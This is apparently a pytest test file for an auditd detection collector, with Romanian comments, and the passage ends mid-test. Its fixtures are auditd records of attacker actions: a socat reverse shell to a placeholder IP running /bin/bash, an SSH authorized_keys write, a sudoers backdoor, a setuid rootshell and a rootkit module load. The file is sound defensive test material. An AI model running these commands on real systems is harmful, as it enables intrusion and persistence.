"""Corelatorul auditd: SYSCALL + PATH + EXECVE.

Regulile din deploy/audit/sentinel.rules supravegheau exact semnalele de
post-compromitere — chei SSH, sudoers, cron, unități systemd, webroot, nc/socat
— iar colectorul arunca tipurile de înregistrări pe care le produc. Kernelul
scria, audit.log conținea, baza de date nu vedea nimic.

Liniile din fixture-uri sunt copiate din formatul real auditd de pe RHEL 9.

Un singur lucru e schimbat față de înregistrările de pe gazdă: numele contului
din căile `/home` e scris `deploy`, ca în restul documentației. Depozitul e
public și contul real e jumătate dintr-o acreditare SSH — vezi
`tests/security/test_repo_is_sanitised.py`. Nimic din ce dovedesc testele astea
nu depinde de el: se verifică rezolvarea căilor, `nametype=PARENT`, tratarea
dirfd-urilor și lipirea de `cwd`, deci contează ca perechile cwd/PARENT să fie
aceeași cale și ca ea să rămână bine formată, nu cum se numește contul.
"""
from __future__ import annotations

import ast
from pathlib import Path

import pytest

from sentinel.collectors.auditd import (parse_auditd, parse_auditd_group,
                                        parse_auditd_lines)

REPO = Path(__file__).resolve().parents[2]
COLLECTOR = REPO / "sentinel" / "collectors" / "auditd.py"

# O cheie SSH scrisă în /root/.ssh — semnalul de persistență numărul unu.
SSH_KEY_WRITE = [
    'type=SYSCALL msg=audit(1754390000.123:8801): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=ffffff9c a1=7ffd0 a2=241 a3=1b6 items=2 ppid=4210 '
    'pid=4877 auid=1000 uid=0 gid=0 euid=0 comm="tee" exe="/usr/bin/tee" '
    'subj=unconfined key="sentinel_ssh"',
    'type=CWD msg=audit(1754390000.123:8801): cwd="/tmp"',
    'type=PATH msg=audit(1754390000.123:8801): item=0 name="/root/.ssh" '
    'inode=131 dev=fd:00 mode=040700 ouid=0 ogid=0 nametype=PARENT',
    'type=PATH msg=audit(1754390000.123:8801): item=1 '
    'name="/root/.ssh/authorized_keys" inode=0 mode=0100600 ouid=0 ogid=0 '
    'nametype=CREATE',
    'type=PROCTITLE msg=audit(1754390000.123:8801): proctitle=746565',
]

SOCAT_EXEC = [
    'type=SYSCALL msg=audit(1754390100.456:8900): arch=c000003e syscall=59 '
    'success=yes exit=0 items=2 ppid=3300 pid=5001 auid=1000 uid=1000 '
    'comm="socat" exe="/usr/bin/socat" key="sentinel_exec"',
    'type=EXECVE msg=audit(1754390100.456:8900): argc=3 a0="socat" '
    'a1="TCP:198.51.100.9:4444" a2="EXEC:/bin/bash"',
    'type=PATH msg=audit(1754390100.456:8900): item=0 name="/usr/bin/socat" '
    'nametype=NORMAL',
]

SUDOERS_WRITE = [
    'type=SYSCALL msg=audit(1754390200.001:9000): arch=c000003e syscall=257 '
    'success=yes exit=4 items=2 ppid=1 pid=6100 auid=1000 uid=0 comm="vim" '
    'exe="/usr/bin/vim" key="sentinel_priv"',
    'type=PATH msg=audit(1754390200.001:9000): item=1 '
    'name="/etc/sudoers.d/backdoor" nametype=CREATE',
]

# `chmod u+s /tmp/.hidden/rootshell`, exact forma pe care o produce regula
# livrată: fchmodat (syscall 268), modul în a2, cheia sentinel_suid.
SUID_CHMOD = [
    'type=SYSCALL msg=audit(1754390600.500:9400): arch=c000003e syscall=268 '
    'success=yes exit=0 a0=ffffff9c a1=55e0b8f0 a2=9ed a3=0 items=1 ppid=4200 '
    'pid=4900 auid=1000 uid=1000 gid=1000 euid=1000 tty=pts0 ses=3 '
    'comm="chmod" exe="/usr/bin/chmod" subj=unconfined key="sentinel_suid"',
    'type=CWD msg=audit(1754390600.500:9400): cwd="/home/deploy"',
    'type=PATH msg=audit(1754390600.500:9400): item=0 '
    'name="/tmp/.hidden/rootshell" inode=917 dev=fd:00 mode=0104755 ouid=0 '
    'ogid=0 nametype=NORMAL',
    'type=PROCTITLE msg=audit(1754390600.500:9400): proctitle=63686D6F6400752B73',
]

# `insmod ./rootkit.ko`. finit_module (syscall 313) nu atinge niciun nume, deci
# grupul nu are înregistrare PATH — și regula fără filtru pe auid prinde exact
# cazul fără sesiune în spate.
MODULE_LOAD = [
    'type=SYSCALL msg=audit(1754390700.900:9500): arch=c000003e syscall=313 '
    'success=yes exit=0 a0=3 a1=55d0 a2=0 a3=0 items=0 ppid=6000 pid=6001 '
    'auid=4294967295 uid=0 gid=0 comm="insmod" exe="/usr/sbin/insmod" '
    'subj=unconfined key="sentinel_module"',
    'type=PROCTITLE msg=audit(1754390700.900:9500): '
    'proctitle=696E736D6F64002E2F726F6F746B69742E6B6F',
]

# `cat /root/.pgpass`, o momeală citită. openat (257) cu succes, fără PATH de
# tip CREATE/DELETE — fișierul exista deja, cineva doar l-a deschis.
BAIT_READ = [
    'type=SYSCALL msg=audit(1754390800.100:9600): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=ffffff9c a1=55e1 a2=0 a3=0 items=1 ppid=4300 '
    'pid=5200 auid=1000 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm="cat" '
    'exe="/usr/bin/cat" subj=unconfined key="sentinel_bait"',
    'type=CWD msg=audit(1754390800.100:9600): cwd="/root"',
    'type=PATH msg=audit(1754390800.100:9600): item=0 name="/root/.pgpass" '
    'inode=555 dev=fd:00 mode=0100600 ouid=0 ogid=0 nametype=NORMAL',
    'type=PROCTITLE msg=audit(1754390800.100:9600): '
    'proctitle=636174002F726F6F742F2E706770617373',
]

# Regula altcuiva de pe aceeași gazdă. Nu e a noastră, nu ne privește.
FOREIGN_RULE = [
    'type=SYSCALL msg=audit(1754390300.777:9100): arch=c000003e syscall=257 '
    'success=yes exit=5 pid=7000 auid=0 uid=0 comm="logrotate" '
    'exe="/usr/sbin/logrotate" key="distro_something"',
    'type=PATH msg=audit(1754390300.777:9100): item=0 name="/var/log/x" '
    'nametype=NORMAL',
]

# Fără cheie deloc: marea majoritate a traficului auditd pe o gazdă obișnuită.
UNKEYED = [
    'type=SYSCALL msg=audit(1754390400.000:9200): arch=c000003e syscall=2 '
    'success=yes exit=3 pid=8000 auid=0 uid=0 comm="sshd" exe="/usr/sbin/sshd"',
    'type=PATH msg=audit(1754390400.000:9200): item=0 name="/etc/hosts" '
    'nametype=NORMAL',
]


# --- ce se păstrează și ce nu ---------------------------------------------
def test_a_key_written_into_root_ssh_becomes_an_event():
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev is not None, "scrierea unei chei SSH nu are voie să fie aruncată"
    assert ev.source == "auditd"
    assert ev.action == "ssh_key_change"
    assert ev.file_path == "/root/.ssh/authorized_keys"
    assert ev.process == "/usr/bin/tee"
    assert ev.raw["audit_key"] == "sentinel_ssh"


def test_the_target_file_wins_over_its_parent_directory():
    """Un syscall raportează și directorul, și fișierul. Fără preferința pe
    nametype, jumătate din alerte ar arăta „/root/.ssh" în loc de fișierul
    chiar atins — adevărat, dar inutil."""
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev.file_path.endswith("authorized_keys")
    assert ev.raw["paths"][0] == "/root/.ssh"      # păstrat ca dovadă
    assert len(ev.raw["paths"]) == 2


def test_the_executed_command_line_is_kept():
    """`socat TCP:...:4444 EXEC:/bin/bash` — argumentele SUNT alerta. Fără ele
    rămâne „cineva a rulat socat", ceea ce nu deosebește un reverse shell de
    un script de administrare."""
    ev = parse_auditd_group(SOCAT_EXEC)
    assert ev.action == "suspicious_exec"
    assert "4444" in ev.raw["argv"]
    assert "EXEC:/bin/bash" in ev.raw["argv"]


def test_sudoers_modification_is_captured():
    ev = parse_auditd_group(SUDOERS_WRITE)
    assert ev.action == "sudoers_change"
    assert ev.file_path == "/etc/sudoers.d/backdoor"


def test_a_setuid_chmod_becomes_an_event():
    """`chmod u+s` e root fără parolă, oricând, și supraviețuiește repornirii.

    Regula `sentinel_suid` era încărcată în nucleu și tradusă de colector, dar
    `suid_change` lipsea din `ACTIONS`: primul `chmod u+s` de la un utilizator
    conectat ridica ValueError și arunca tot lotul de ingestie, iar cursorul
    auditd rămânea pe loc — deci turul următor recitea aceleași linii și pica la
    fel. Semnalul nu doar că se pierdea: oprea ingestia.
    """
    evs = parse_auditd_lines(SUID_CHMOD)
    assert len(evs) == 1, "grupul livrat de regula sentinel_suid trebuie să producă un eveniment"
    ev = evs[0]
    assert ev.action == "suid_change"
    assert ev.file_path == "/tmp/.hidden/rootshell", "CE fișier a devenit setuid e întrebarea"
    assert ev.process == "/usr/bin/chmod"
    assert ev.username == "1000"
    assert ev.raw["audit_key"] == "sentinel_suid"
    assert "unmapped_action" not in ev.raw, "acțiunea nu are voie să fie degradată"


def test_a_kernel_module_load_becomes_an_event():
    """Sub kernel nu mai există nimic care să observe.

    Aceeași divergență ca la `suid_change`, pe `module_load`: regula nu are
    filtru pe auid, deci un `finit_module` fără nicio sesiune în spate — cazul
    cel mai alarmant — era exact cel care oprea ingestia. Grupul nu are
    înregistrare PATH: `init_module` nu atinge niciun nume, iar evenimentul
    trebuie să treacă și fără cale.
    """
    evs = parse_auditd_lines(MODULE_LOAD)
    assert len(evs) == 1, "un modul de kernel încărcat trebuie să ajungă eveniment"
    ev = evs[0]
    assert ev.action == "module_load"
    assert ev.file_path is None, "finit_module nu are PATH; nu se inventează unul"
    assert ev.process == "/usr/sbin/insmod"
    assert ev.username is None, "auid=unset nu e un utilizator"
    assert ev.raw["audit_key"] == "sentinel_module"


def test_a_bait_file_read_becomes_an_event():
    """Citirea unei momele e semnalul fără ambiguitate al funcționalității 05:
    fișierul n-are cititor legitim, deci prima citire e dovada. Fără cale sau
    fără acțiunea corectă, `detect/intrusion.bait_touched` n-ar avea pe ce să
    se declanșeze."""
    evs = parse_auditd_lines(BAIT_READ)
    assert len(evs) == 1, "citirea momelii trebuie să producă un eveniment"
    ev = evs[0]
    assert ev.action == "bait_touched"
    assert ev.file_path == "/root/.pgpass"
    assert ev.process == "/usr/bin/cat"
    assert ev.raw["audit_key"] == "sentinel_bait"
    assert "unmapped_action" not in ev.raw, "acțiunea nu are voie să fie degradată"


@pytest.mark.parametrize("group", [FOREIGN_RULE, UNKEYED], ids=["altă regulă", "fără cheie"])
def test_records_that_are_not_ours_are_dropped(group):
    """Filtrul strict pe `sentinel_*` e ce ține promisiunea din antetul
    modulului: auditd poate produce mii de înregistrări pe secundă, iar o
    ingestie nefiltrată e același pericol de umplere a discului."""
    assert parse_auditd_group(group) is None


def test_auid_is_preferred_over_uid():
    """După `sudo su -`, uid e 0 și auid rămâne cine s-a autentificat. La
    întrebarea „cine a făcut asta", uid minte."""
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev.username == "1000"
    assert ev.raw["uid"] == "0"


def test_unset_auid_does_not_become_a_username():
    lines = [SSH_KEY_WRITE[0].replace("auid=1000", "auid=4294967295"),
             SSH_KEY_WRITE[3]]
    assert parse_auditd_group(lines).username is None


# --- gruparea pe lot ------------------------------------------------------
def test_lines_are_grouped_by_serial():
    mixed = UNKEYED + SSH_KEY_WRITE + FOREIGN_RULE + SOCAT_EXEC
    evs = parse_auditd_lines(mixed)
    assert [e.action for e in evs] == ["ssh_key_change", "suspicious_exec"]


def test_single_line_types_still_parse_unchanged():
    """USER_AUTH și rudele au semantică de sine stătătoare și treceau deja.
    Corelatorul nu are voie să le piardă."""
    line = ('type=USER_AUTH msg=audit(1754390500.000:9300): pid=1 uid=0 '
            'auid=4294967295 msg=\'op=PAM:authentication acct="root" '
            'exe="/usr/sbin/sshd" hostname=203.0.113.9 addr=203.0.113.9 '
            'terminal=ssh res=failed\'')
    direct = parse_auditd(line)
    assert direct is not None and direct.action == "auth_fail"
    assert [e.action for e in parse_auditd_lines([line])] == ["auth_fail"]


def test_a_group_split_across_reads_does_not_raise():
    """Tailerul citește pe bucăți; un grup se poate rupe la mijloc. Rezultatul
    acceptabil e un eveniment fără cale, nu o excepție și nu o linie pierdută."""
    ev = parse_auditd_group([SSH_KEY_WRITE[0]])
    assert ev is not None and ev.file_path is None
    assert parse_auditd_group(SSH_KEY_WRITE[2:]) is None


# --- calea relativă și CWD -------------------------------------------------
#
# Incidentul 4268 de pe producție: „Mecanism de persistență modificat: chei SSH
# sau configurație", critic, 62 de detecții, cu `=` și `rotateCount` trecute
# drept fișiere. Grupul de mai jos e copiat după evenimentul brut din spatele
# ultimei detecții: un `openat` din bash, în directorul home, cu numele
# fișierului RELATIV la CWD.
HOME_WRITE_RELATIVE = [
    'type=SYSCALL msg=audit(1754800000.111:20001): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=ffffff9c a1=55d0 a2=241 a3=1b6 items=2 ppid=4000 '
    'pid=4001 auid=1000 uid=1000 comm="bash" exe="/usr/bin/bash" '
    'key="sentinel_ssh"',
    'type=CWD msg=audit(1754800000.111:20001): cwd="/home/deploy"',
    'type=PATH msg=audit(1754800000.111:20001): item=0 name="/home/deploy" '
    'inode=131 dev=fd:00 mode=040700 ouid=1000 ogid=1000 nametype=PARENT',
    'type=PATH msg=audit(1754800000.111:20001): item=1 name="=" inode=0 '
    'mode=0100644 ouid=1000 ogid=1000 nametype=CREATE',
]

# Aceeași formă, dar fișierul chiar e o cheie SSH: `cd ~/.ssh && vi config`.
# Ăsta e cazul care NU are voie să se piardă când se îngustează.
SSH_WRITE_RELATIVE = [
    'type=SYSCALL msg=audit(1754800100.222:20002): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=ffffff9c a1=55d1 a2=241 a3=1b6 items=2 ppid=4000 '
    'pid=4100 auid=1000 uid=1000 comm="vim" exe="/usr/bin/vim" '
    'key="sentinel_ssh"',
    'type=CWD msg=audit(1754800100.222:20002): cwd="/home/deploy/.ssh"',
    'type=PATH msg=audit(1754800100.222:20002): item=0 '
    'name="/home/deploy/.ssh" nametype=PARENT',
    'type=PATH msg=audit(1754800100.222:20002): item=1 name="config" '
    'nametype=CREATE',
]


# Copiat după evenimentul 474918 de pe gazdă: `dnf` rulat din /home/deploy
# înlocuiește /usr/lib/systemd/system/cpupower.service. `renameat` (syscall 264)
# primește descriptorul directorului țintă ca argument, iar descriptorul NU e în
# înregistrare — nici PARENT nu îl are, el poartă cwd-ul.
SYSTEMD_RENAMEAT_VIA_DIRFD = [
    'type=SYSCALL msg=audit(1754810000.100:474918): arch=c000003e syscall=264 '
    'success=yes exit=0 a0=b a1=7ffd1 a2=b a3=7ffd2 items=5 ppid=9000 pid=9001 '
    'auid=1000 uid=0 comm="dnf" exe="/usr/bin/python3.11" '
    'key="sentinel_systemd"',
    'type=CWD msg=audit(1754810000.100:474918): cwd="/home/deploy"',
    'type=PATH msg=audit(1754810000.100:474918): item=0 '
    'name="/home/deploy" nametype=PARENT',
    'type=PATH msg=audit(1754810000.100:474918): item=1 '
    'name="/home/deploy" nametype=PARENT',
    'type=PATH msg=audit(1754810000.100:474918): item=2 '
    'name="cpupower.service;6a78a6f7" nametype=DELETE',
    'type=PATH msg=audit(1754810000.100:474918): item=3 '
    'name="cpupower.service" nametype=CREATE',
]

# Aceeași familie de syscall-uri, dar pe un fișier SSH: numele e relativ la un
# dirfd, deci directorul rămâne necunoscut.
SSH_WRITE_VIA_DIRFD = [
    'type=SYSCALL msg=audit(1754810100.200:474919): arch=c000003e syscall=257 '
    'success=yes exit=3 a0=7 a1=55d2 a2=241 a3=1b6 items=2 ppid=9100 pid=9101 '
    'auid=1000 uid=1000 comm="rsync" exe="/usr/bin/rsync" key="sentinel_ssh"',
    'type=CWD msg=audit(1754810100.200:474919): cwd="/tmp"',
    'type=PATH msg=audit(1754810100.200:474919): item=0 '
    'name="/home/deploy/.ssh" nametype=PARENT',
    'type=PATH msg=audit(1754810100.200:474919): item=1 name="config" '
    'nametype=CREATE',
]


def test_a_relative_name_under_a_real_dirfd_is_not_joined_to_the_cwd():
    """`renameat` cu descriptor de director: baza NU e cwd-ul.

    Evenimentul 474918 de pe gazdă: `dnf`, rulat din directorul home,
    înlocuiește /usr/lib/systemd/system/cpupower.service. Directorul real nu
    apare nicăieri în grup — nici măcar în PARENT, care poartă tot cwd-ul.
    Lipit de cwd ar da „/home/deploy/cpupower.service", o cale care nu a
    existat niciodată pe disc; și, fiind absolută, una pe care garda de evidență
    o acceptă drept plauzibilă. O minciună absolută e mai rea decât un adevăr
    incomplet: numele relativ e cel puțin verificabil cu `ausearch -a SERIAL`.
    """
    ev = parse_auditd_group(SYSTEMD_RENAMEAT_VIA_DIRFD)
    assert ev is not None
    assert ev.file_path == "cpupower.service"
    assert not any(p.startswith("/home/deploy/cpupower")
                   for p in ev.raw["paths"]), "cale inventată în evidență"
    assert ev.raw["path_relative"] is True, 'starea „nu știu unde" trebuie să se vadă în date'


def test_a_dirfd_relative_ssh_write_keeps_its_label():
    """Oglinda: un `openat` pe dirfd, cu PARENT într-un `.ssh`.

    Numele „config" nu poate fi rezolvat, deci nu se știe că e sub `.ssh` — dar
    nici nu se poate demonstra că NU e. Demotarea la `file_write` ar scoate
    rândul de sub regula de persistență (poarta SQL filtrează pe acțiune), adică
    tăcere acolo unde codul dinainte lăsa cel puțin un eveniment etichetat.
    """
    ev = parse_auditd_group(SSH_WRITE_VIA_DIRFD)
    assert ev.file_path == "config", "nu se inventează /tmp/config"
    assert ev.action == "ssh_key_change"


def test_the_cwd_must_agree_with_the_parent_record():
    """AT_FDCWD în argumente, dar PARENT în altă parte: ceva nu se leagă.

    Cu AT_FDCWD nucleul scrie ca PARENT chiar cwd-ul sau un descendent al lui.
    Un părinte absolut care îl contrazice înseamnă că numele nu a fost rezolvat
    de la cwd, oricât ar spune argumentele — și atunci nu se rezolvă deloc.
    """
    lines = [SSH_WRITE_VIA_DIRFD[0].replace("a0=7", "a0=ffffff9c"),
             *SSH_WRITE_VIA_DIRFD[1:]]
    assert parse_auditd_group(lines).file_path == "config"


def test_an_unknown_syscall_number_does_not_resolve():
    """Tabela de dirfd-uri e finită. Un syscall pe care nu-l cunoaște e exact
    cazul în care nu se știe dacă numele e relativ la cwd sau la un descriptor —
    iar necunoscutul nu se rotunjește în favoarea noastră."""
    lines = [HOME_WRITE_RELATIVE[0].replace("syscall=257", "syscall=9999"),
             *HOME_WRITE_RELATIVE[1:]]
    assert parse_auditd_group(lines).file_path == "="


def test_a_relative_name_is_resolved_against_the_cwd():
    """`cd ~/.ssh && vi config` producea file_path="config".

    Nicio îngustare pe cale nu poate recunoaște „config" ca fiind un fișier SSH,
    deci scrierea într-un `.ssh` din /home era ARUNCATĂ de regula de detecție:
    un fals-negativ pe exact semnalul pentru care există urmărirea. Numele din
    PATH e relativ la înregistrarea CWD din același eveniment, iar CWD era
    aruncat la parsare.
    """
    ev = parse_auditd_group(SSH_WRITE_RELATIVE)
    assert ev is not None
    assert ev.file_path == "/home/deploy/.ssh/config"
    assert ev.action == "ssh_key_change", "o cheie SSH reală rămâne cheie SSH"


def test_an_absolute_name_is_left_alone():
    """CWD e /tmp, fișierul e /root/.ssh/authorized_keys. Rezolvarea nu are voie
    să lipească CWD-ul peste o cale care e deja absolută."""
    ev = parse_auditd_group(SSH_KEY_WRITE)
    assert ev.file_path == "/root/.ssh/authorized_keys"


def test_an_ordinary_home_write_is_not_reported_as_a_path():
    """`=` și `rotateCount` nu sunt căi de fișier.

    Erau nume relative la /home/deploy, iar `_best_path` le prefera fiindcă
    ele poartă nametype=CREATE, în timp ce calea absolută din grup e doar
    directorul părinte. Așa a ajuns un `openat` din bash să fie citat ca fișier
    într-o alertă critică de persistență.
    """
    ev = parse_auditd_group(HOME_WRITE_RELATIVE)
    assert ev is not None
    assert ev.file_path == "/home/deploy/="
    assert "=" not in ev.raw["paths"], "un token relativ nu are voie să treacă drept cale"


def test_a_home_write_with_nothing_to_do_with_ssh_is_not_called_an_ssh_key_change():
    """`-w /home` e cea mai largă urmărire din fișierul de reguli.

    Nucleul nu cunoaște globuri, deci nu are cum să ceară doar /home/*/.ssh/:
    fiecare fișier scris de oricine în directorul lui sosește cu cheia
    `sentinel_ssh`. Eticheta „schimbare de cheie SSH" pusă la colectare e ce
    ridica regula de persistență la CRITIC de 62 de ori pe nimic.

    Evenimentul se păstrează — se pierde doar eticheta falsă.
    """
    ev = parse_auditd_group(HOME_WRITE_RELATIVE)
    assert ev.action == "file_write"
    assert ev.raw["audit_key"] == "sentinel_ssh", "cheia rămâne, ca demotarea să fie vizibilă"


def test_a_group_without_a_cwd_keeps_the_name_instead_of_inventing_a_path():
    """Fără CWD nu se poate ști UNDE s-a scris.

    „Nu știu unde" și „nu s-a atins nimic" sunt stări diferite: numele rămâne
    în eveniment, nu se inventează un director, iar garda din motor e cea care
    refuză să escaladeze o evidență fără nicio cale absolută.
    """
    lines = [ln for ln in SSH_WRITE_RELATIVE if not ln.startswith("type=CWD")]
    ev = parse_auditd_group(lines)
    assert ev.file_path == "config"
    assert ev.action == "ssh_key_change"


def test_a_hex_encoded_name_is_decoded():
    """auditd scrie numele în hex când conține spații sau ghilimele.

    Netratat, blobul hex ar fi luat drept nume relativ și lipit după CWD,
    producând o cale care nu există pe disc — evidență pe care operatorul nu o
    poate verifica.
    """
    lines = [SSH_WRITE_RELATIVE[0], SSH_WRITE_RELATIVE[1],
             'type=PATH msg=audit(1754800100.222:20002): item=1 '
             'name=6D79206B6579 nametype=CREATE']
    ev = parse_auditd_group(lines)
    assert ev.file_path == "/home/deploy/.ssh/my key"


def test_a_null_name_is_not_a_path():
    """auditd scrie name=(null) când syscall-ul nu a atins un nume. Trecut mai
    departe, ar apărea ca fișier în evidența unei alerte critice."""
    lines = [SSH_KEY_WRITE[0], SSH_KEY_WRITE[1],
             'type=PATH msg=audit(1754390000.123:8801): item=0 name=(null) '
             'nametype=UNKNOWN']
    ev = parse_auditd_group(lines)
    assert ev.file_path is None


# --- legătura cu regulile chiar instalate ---------------------------------
def test_every_audit_rule_key_has_a_mapping():
    """Fiecare `-k` din fișierul de reguli trebuie să aibă traducere în
    colector. O cheie fără mapare e o regulă care rulează pe server, umple
    audit.log și nu produce niciodată nimic — exact situația reparată aici."""
    from sentinel.collectors.auditd import _WATCH_KEYS
    rules = (REPO / "deploy" / "audit" / "sentinel.rules").read_text(encoding="utf-8")
    keys = set()
    for line in rules.splitlines():
        for token in line.split():
            if token.startswith("-k") and token != "-k":
                keys.add(token[2:])
            elif token.startswith("key="):
                keys.add(token[4:])
        if " -k " in line:
            keys.add(line.split(" -k ")[1].split()[0])
    sentinel_keys = {k for k in keys if k.startswith("sentinel_")}
    assert sentinel_keys, "nu am găsit nicio cheie în fișierul de reguli"
    missing = sentinel_keys - set(_WATCH_KEYS)
    assert not missing, f"chei de audit fără mapare în colector: {sorted(missing)}"


# --- legătura cu vocabularul modelului ------------------------------------
def test_every_action_the_collector_can_emit_exists_in_the_model():
    """A doua jumătate a lanțului: cheie de audit -> acțiune -> `ACTIONS`.

    Prima jumătate era verificată (fiecare `-k` are mapare), a doua nu era
    deloc. Așa au ajuns `suid_change` și `module_load` să fie traduse de
    colector și respinse de model: două liste ale aceluiași vocabular, în două
    fișiere, fără nimic între ele. Rezultatul nu e un eveniment pierdut, ci
    ingestia oprită la prima apariție — cursorul nu avansează peste un lot care
    ridică excepție, deci lotul se reia identic la fiecare secundă.

    Verificarea derivă din tabelele colectorului, nu dintr-o listă scrisă aici:
    o cheie nouă mapată la o acțiune nouă pică fără să fie nevoie ca cineva
    să-și amintească de testul ăsta.
    """
    from sentinel.collectors.auditd import (EMITTED_ACTIONS, _KEEP,
                                            _RESULT_ACTIONS, _WATCH_KEYS)
    from sentinel.model.event import ACTIONS

    # Non-vacuitate: dacă derivarea iese goală sau ratează tabelele, testul de
    # mai jos ar trece verificând nimic — exact tiparul care a costat o pană.
    expected = ({*_WATCH_KEYS.values(), *_KEEP.values()} - set(_RESULT_ACTIONS)
                | {a for outcomes in _RESULT_ACTIONS.values() for a in outcomes})
    assert expected <= EMITTED_ACTIONS, (
        "vocabularul derivat nu acoperă tabelele colectorului: "
        f"{sorted(expected - EMITTED_ACTIONS)}")
    assert {"suid_change", "module_load", "suspicious_exec"} <= EMITTED_ACTIONS

    missing = EMITTED_ACTIONS - set(ACTIONS)
    assert not missing, (
        "acțiuni pe care colectorul auditd le produce și pe care modelul le "
        f"respinge cu ValueError: {sorted(missing)}")


def _string_constant(node: ast.AST | None) -> str | None:
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    return None


def _action_literals(source: str) -> set[str]:
    """Fiecare șir atribuit lui `action` în sursa dată.

    Trei forme, nu una. Scanarea citea numai `ast.Assign` cu țintă `Name`, deci
    `action: str = "x"` (AnnAssign) și `action, _ = "x", 1` (dezambalare)
    treceau amândouă cu suita verde — adică garda raporta „nimic evadat" fără
    să se fi uitat la două dintre cele trei feluri în care se poate scrie.
    """
    found: set[str] = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.AnnAssign):
            if isinstance(node.target, ast.Name) and node.target.id == "action":
                if (value := _string_constant(node.value)) is not None:
                    found.add(value)
            continue
        if not isinstance(node, ast.Assign):
            continue
        for target in node.targets:
            if isinstance(target, ast.Name) and target.id == "action":
                if (value := _string_constant(node.value)) is not None:
                    found.add(value)
            # `action, altceva = "x", 1` — dezambalare poziție cu poziție.
            elif isinstance(target, (ast.Tuple, ast.List)) and isinstance(
                    node.value, (ast.Tuple, ast.List)):
                for slot, value_node in zip(target.elts, node.value.elts):
                    if isinstance(slot, ast.Name) and slot.id == "action":
                        if (value := _string_constant(value_node)) is not None:
                            found.add(value)
    return found


def test_no_action_literal_in_the_collector_escapes_the_vocabulary():
    """Garda derivată citește tabelele; o ramură nouă le poate ocoli.

    `EMITTED_ACTIONS` se calculează din `_KEEP`, `_WATCH_KEYS` și constantele
    numite. Un `action = "ceva_nou"` scris direct într-o ramură nu apare în
    niciuna dintre ele, deci ar trece de garda de mai sus și ar reproduce fix
    defectul: colectorul produce o acțiune pe care modelul nu o cunoaște.

    Scanarea se verifică întâi pe ea însăși — un scanner care nu găsește nimic
    ar trece pe orice fișier, inclusiv pe unul greșit.
    """
    from sentinel.collectors.auditd import EMITTED_ACTIONS, _RESULT_ACTIONS

    # Auto-verificarea acoperă toate formele pe care le pretinde scanarea. Cu
    # numai prima, un `action: str = "..."` sau o dezambalare treceau nevăzute,
    # iar testul raporta „nimic evadat" fără să se fi uitat.
    probes = {
        "atribuire simplă": 'def f():\n    action = "not_a_real_action"\n',
        "cu adnotare":      'def f():\n    action: str = "not_a_real_action"\n',
        "dezambalare":      'def f():\n    action, _n = "not_a_real_action", 1\n',
    }
    for why, probe in probes.items():
        assert _action_literals(probe) == {"not_a_real_action"}, f"scanarea nu vede: {why}"

    allowed = EMITTED_ACTIONS | set(_RESULT_ACTIONS)
    escaped = _action_literals(COLLECTOR.read_text(encoding="utf-8")) - allowed
    assert not escaped, f"acțiuni scrise în linie, în afara vocabularului derivat: {sorted(escaped)}"


def test_the_model_still_rejects_an_action_it_does_not_know():
    """Validarea din `Event` e ce a scos divergența la iveală; nu se scoate.

    Reparația corectă e să adaugi acțiunea în `ACTIONS`, nu să tai verificarea:
    fără ea, orice greșeală de tipar într-o mapare ar produce rânduri pe care
    nicio regulă de detecție nu le interoghează, tăcut și pentru totdeauna.
    """
    from datetime import datetime, timezone

    from sentinel.model.event import Event

    with pytest.raises(ValueError):
        Event(ts=datetime.now(timezone.utc), source="auditd", action="not_a_real_action")


# --- încasarea eșecului ----------------------------------------------------
BAD_KEY_GROUP = [
    'type=SYSCALL msg=audit(1754390800.000:9600): arch=c000003e syscall=257 '
    'success=yes exit=3 items=1 ppid=1 pid=7100 auid=1000 uid=0 comm="tee" '
    'exe="/usr/bin/tee" key="sentinel_viitor"',
    'type=PATH msg=audit(1754390800.000:9600): item=0 name="/etc/ceva" '
    'nametype=CREATE',
]


def test_an_action_the_model_rejects_does_not_take_the_batch_down(monkeypatch, caplog):
    """Un lot care conține un eveniment invalid nu are voie să se piardă.

    Așa arăta defectul din producție: `Event` ridica ValueError, excepția urca
    prin `parse_auditd_lines` până în `poll_once`, iar lotul — cu tot cu
    evenimentele nginx și Suricata din el — nu se mai insera și niciun cursor nu
    mai avansa. Turul următor recitea aceleași linii și pica identic, la
    nesfârșit.

    Evenimentul nu se aruncă tăcut: rămâne în lot cu acțiunea `unknown`, cu
    cheia de audit și cu acțiunea respinsă păstrate în `raw`, plus o linie ERROR
    în jurnal. Se pierde alertarea, nu evidența.
    """
    from sentinel.collectors import auditd

    monkeypatch.setitem(auditd._WATCH_KEYS, "sentinel_viitor", "not_a_real_action")

    with caplog.at_level("ERROR", logger="sentinel.collectors.auditd"):
        evs = parse_auditd_lines(BAD_KEY_GROUP + SSH_KEY_WRITE)

    assert [e.action for e in evs] == ["unknown", "ssh_key_change"], (
        "evenimentul valid din același lot trebuie să supraviețuiască")
    assert evs[0].raw["unmapped_action"] == "not_a_real_action"
    assert evs[0].raw["audit_key"] == "sentinel_viitor"
    assert evs[0].file_path == "/etc/ceva", "evidența rămâne, doar eticheta se pierde"

    errors = [r for r in caplog.records if r.levelname == "ERROR"]
    assert len(errors) == 1, [r.getMessage() for r in caplog.records]
    assert getattr(errors[0], "action", None) == "not_a_real_action"


def test_an_unparsable_record_is_skipped_instead_of_killing_the_batch(caplog):
    """Nicio linie stricată nu are voie să blocheze cursorul.

    Ștampila e citită cu `datetime.fromtimestamp`, care ridică pe o valoare
    imposibilă — o linie tăiată la mijloc de rotația jurnalului ajunge acolo.
    Fără prindere, efectul e identic cu cel al acțiunii necunoscute: lotul
    întreg cade, cursorul stă pe loc și ingestia se blochează pe aceeași
    înregistrare până la rotația următoare.
    """
    corrupt = [ln.replace("1754390000", "99999999999999999") for ln in SSH_KEY_WRITE]

    with caplog.at_level("ERROR", logger="sentinel.collectors.auditd"):
        evs = parse_auditd_lines(corrupt + SOCAT_EXEC)

    assert [e.action for e in evs] == ["suspicious_exec"], (
        "grupul stricat se sare; restul lotului trece")
    errors = [r for r in caplog.records if r.levelname == "ERROR"]
